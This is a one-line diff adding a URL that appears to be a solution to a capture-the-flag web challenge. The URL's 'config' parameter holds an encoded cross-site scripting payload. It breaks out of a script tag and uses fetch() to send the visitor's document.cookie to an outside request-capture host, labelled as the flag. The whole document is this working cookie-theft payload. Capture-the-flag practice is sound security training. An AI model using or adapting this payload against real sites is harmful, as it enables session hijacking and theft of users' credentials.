@@ -1,0 +1,1 @@
+https://particles.ctf.zoolab.org/?config=%3C/script%3E%3Cscript%3Efetch(%22https://eric070021.free.beeceptor.com?flag=%22%2bdocument.cookie)%3C/script%3E
